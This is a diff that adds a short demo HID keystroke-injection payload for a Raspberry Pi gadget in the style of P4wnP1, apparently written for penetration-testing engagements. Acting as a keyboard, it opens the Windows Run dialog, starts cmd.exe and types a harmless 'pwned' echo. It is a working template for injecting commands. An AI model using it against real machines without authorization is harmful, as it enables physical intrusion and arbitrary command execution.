@@ -1,0 +1,10 @@
+# Demo HID payload — opens Run dialog on Windows host (P4wnP1-style).
+# Customize for your engagement; run with gadget + HID enabled.
+DELAY 2000
+GUI r
+DELAY 500
+STRING cmd.exe
+ENTER
+DELAY 800
+STRING echo pwned-by-rpi-agent
+ENTER
